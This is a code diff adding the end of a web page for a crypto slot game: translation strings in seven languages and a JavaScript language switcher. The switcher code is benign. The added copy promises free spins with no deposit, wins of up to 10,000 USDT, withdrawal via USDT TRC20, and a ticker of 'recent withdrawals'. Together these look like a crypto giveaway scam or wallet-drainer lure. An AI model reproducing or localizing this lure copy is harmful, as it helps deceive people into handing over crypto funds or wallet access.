+    tr: { howto_title: 'Nasıl Oynanır · Açıklama', howto_p1: '<span class="highlight-cyan">5 makarayı çevir</span> ve kripto sembollerini eşleştir. Başlamak için <em>3 ücretsiz çevirme</em> hakkın var — para yatırmaya gerek yok!', howto_p2: 'Orta ödeme hattında <em>2+ aynı sembolü</em> eşleştir ve kazan. 5 aynı için <em>10,000 USDT</em>\'ye kadar kazan!', howto_p3: 'Çevirmelerinden sonra kazançları bakiyene al, ardından USDT TRC20 ile <span class="highlight-cyan">ödülleri çek</span>.', banner_kicker: 'KAZAN', banner_amt: '10,000 USDT', banner_end: 'ÜCRETSİZ!', banner_sub: 'Başlangıç bakiyeni açmak için 3 kez çevir. <em>Para yatırmaya gerek yok!</em>', spin_btn: 'ŞİMDİ ÇEVİR', spins_left: 'KALAN ÜCRETSİZ ÇEVİRME:', rolling_title: '⛓ SON TRC20 ÇEKİMLERİ' },
+    vi: { howto_title: 'Cách Chơi · Mô Tả', howto_p1: '<span class="highlight-cyan">Quay 5 cuộn</span> để khớp các biểu tượng crypto. Bạn có <em>3 lượt quay miễn phí</em> để bắt đầu — không cần nạp tiền!', howto_p2: 'Khớp <em>2+ biểu tượng giống nhau</em> trên dòng thanh toán trung tâm để thắng. Thắng đến <em>10,000 USDT</em> cho 5 biểu tượng giống nhau!', howto_p3: 'Sau khi quay, nhận thưởng vào số dư, sau đó <span class="highlight-cyan">rút phần thưởng</span> qua USDT TRC20.', banner_kicker: 'THẮNG ĐẾN', banner_amt: '10,000 USDT', banner_end: 'MIỄN PHÍ!', banner_sub: 'Quay 3 lần để mở khóa số dư ban đầu. <em>Không cần nạp tiền!</em>', spin_btn: 'QUAY NGAY', spins_left: 'LƯỢT QUAY MIỄN PHÍ CÒN LẠI:', rolling_title: '⛓ RÚT TRC20 GẦN ĐÂY' },
+    th: { howto_title: 'วิธีเล่น · คำอธิบาย', howto_p1: '<span class="highlight-cyan">หมุน 5 รีล</span> เพื่อจับคู่สัญลักษณ์คริปโต คุณได้รับ <em>3 สปินฟรี</em> เริ่มต้น — ไม่ต้องฝากเงิน!', howto_p2: 'จับคู่ <em>2+ สัญลักษณ์เหมือนกัน</em> บนเพย์ไลน์กลางเพื่อชนะ รับสูงสุด <em>10,000 USDT</em> สำหรับ 5 สัญลักษณ์เหมือนกัน!', howto_p3: 'หลังหมุน รับเงินรางวัลเข้าสู่ยอดคงเหลือ แล้ว <span class="highlight-cyan">ถอนรางวัล</span> ผ่าน USDT TRC20', banner_kicker: 'ชนะสูงสุด', banner_amt: '10,000 USDT', banner_end: 'ฟรี!', banner_sub: 'หมุน 3 ครั้งเพื่อปลดล็อกยอดคงเหลือเริ่มต้น <em>ไม่ต้องฝากเงิน!</em>', spin_btn: 'หมุนเลย', spins_left: 'สปินฟรีที่เหลือ:', rolling_title: '⛓ การถอน TRC20 ล่าสุด' },
+    id: { howto_title: 'Cara Bermain · Deskripsi', howto_p1: '<span class="highlight-cyan">Putar 5 gulungan</span> untuk mencocokkan simbol crypto. Anda mendapat <em>3 putaran gratis</em> untuk memulai — tanpa deposit!', howto_p2: 'Cocokkan <em>2+ simbol identik</em> di payline tengah untuk menang. Menangkan hingga <em>10,000 USDT</em> untuk 5 simbol sama!', howto_p3: 'Setelah putaran, klaim kemenangan ke saldo, lalu <span class="highlight-cyan">tarik hadiah</span> via USDT TRC20.', banner_kicker: 'MENANG HINGGA', banner_amt: '10,000 USDT', banner_end: 'GRATIS!', banner_sub: 'Putar 3 kali untuk membuka saldo awal. <em>Tidak perlu deposit!</em>', spin_btn: 'PUTAR SEKARANG', spins_left: 'PUTARAN GRATIS TERSISA:', rolling_title: '⛓ PENARIKAN TRC20 TERBARU' },
+    ms: { howto_title: 'Cara Bermain · Penerangan', howto_p1: '<span class="highlight-cyan">Putar 5 gelendong</span> untuk memadankan simbol crypto. Anda mendapat <em>3 putaran percuma</em> untuk mula — tiada deposit!', howto_p2: 'Padankan <em>2+ simbol sama</em> pada payline tengah untuk menang. Menang sehingga <em>10,000 USDT</em> untuk 5 sama!', howto_p3: 'Selepas putaran, tuntut kemenangan ke baki, kemudian <span class="highlight-cyan">tarik ganjaran</span> melalui USDT TRC20.', banner_kicker: 'MENANG HINGGA', banner_amt: '10,000 USDT', banner_end: 'PERCUMA!', banner_sub: 'Putar 3 kali untuk membuka baki permulaan. <em>Tiada deposit diperlukan!</em>', spin_btn: 'PUTAR SEKARANG', spins_left: 'PUTARAN PERCUMA TINGGAL:', rolling_title: '⛓ PENGELUARAN TRC20 TERKINI' },
+    nl: { howto_title: 'Hoe te Spelen · Beschrijving', howto_p1: '<span class="highlight-cyan">Draai de 5 rollen</span> om crypto-symbolen te matchen. Je krijgt <em>3 gratis spins</em> om te starten — geen storting nodig!', howto_p2: 'Match <em>2+ identieke symbolen</em> op de middelste payline om te winnen. Win tot <em>10,000 USDT</em> voor 5 dezelfde!', howto_p3: 'Na je spins, claim winsten naar je saldo en <span class="highlight-cyan">extraheer beloningen</span> via USDT TRC20.', banner_kicker: 'WIN TOT', banner_amt: '10,000 USDT', banner_end: 'GRATIS!', banner_sub: 'Draai 3 keer om je startsaldo te ontgrendelen. <em>Geen storting nodig!</em>', spin_btn: 'NU DRAAIEN', spins_left: 'RESTERENDE GRATIS SPINS:', rolling_title: '⛓ RECENTE TRC20-OPNAMES' },
+    pl: { howto_title: 'Jak Grać · Opis', howto_p1: '<span class="highlight-cyan">Obracaj 5 bębnów</span>, aby dopasować symbole krypto. Masz <em>3 darmowe obroty</em> na start — bez depozytu!', howto_p2: 'Dopasuj <em>2+ identyczne symbole</em> na środkowej linii wypłat, aby wygrać. Wygraj do <em>10,000 USDT</em> za 5 takich samych!', howto_p3: 'Po obrotach odbierz wygrane na saldo, następnie <span class="highlight-cyan">wypłać nagrody</span> przez USDT TRC20.', banner_kicker: 'WYGRAJ DO', banner_amt: '10,000 USDT', banner_end: 'ZA DARMO!', banner_sub: 'Obracaj 3 razy, aby odblokować saldo startowe. <em>Bez depozytu!</em>', spin_btn: 'OBRACAJ TERAZ', spins_left: 'POZOSTAŁE DARMOWE OBROTY:', rolling_title: '⛓ OSTATNIE WYPŁATY TRC20' }
+  };
+
+  const langSelect = document.getElementById('langSelect');
+  if (!langSelect) return;
+
+  function switchLanguage(code) {
+    const trans = TRANSLATIONS[code] || TRANSLATIONS.en;
+    const howtoTitle = document.getElementById('howtoTitleText');
+    const howtoP1 = document.getElementById('howtoP1');
+    const howtoP2 = document.getElementById('howtoP2');
+    const howtoP3 = document.getElementById('howtoP3');
+    if (howtoTitle) howtoTitle.textContent = trans.howto_title;
+    if (howtoP1) howtoP1.innerHTML = trans.howto_p1;
+    if (howtoP2) howtoP2.innerHTML = trans.howto_p2;
+    if (howtoP3) howtoP3.innerHTML = trans.howto_p3;
+    const kicker = document.getElementById('bannerKicker');
+    const amt = document.getElementById('bannerAmt');
+    const end = document.getElementById('bannerEnd');
+    const sub = document.getElementById('bannerSub');
+    if (kicker) kicker.textContent = trans.banner_kicker;
+    if (amt) amt.textContent = trans.banner_amt;
+    if (end) end.textContent = trans.banner_end;
+    if (sub) sub.innerHTML = trans.banner_sub;
+    const spinBtn = document.getElementById('spinBtn');
+    if (spinBtn && !spinBtn.classList.contains('is-extract') && !spinBtn.disabled) {
+      spinBtn.textContent = trans.spin_btn;
+    }
+    const spinsLeftDiv = document.getElementById('spinsLeftDiv');
+    if (spinsLeftDiv) {
+      const strong = spinsLeftDiv.querySelector('strong');
+      const strongVal = strong ? strong.textContent : '3';
+      spinsLeftDiv.innerHTML = trans.spins_left + ' <strong id="spinsText">' + strongVal + '</strong>/3';
+    }
+    const rollingTitleText = document.getElementById('rollingTitleText');
+    if (rollingTitleText) rollingTitleText.textContent = trans.rolling_title;
+  }
+
+  langSelect.addEventListener('change', function() {
+    switchLanguage(this.value);
+  });
+
+  switchLanguage('en');
+  window.switchLanguage = switchLanguage;
+})();
+</script>
+</body>
+</html>
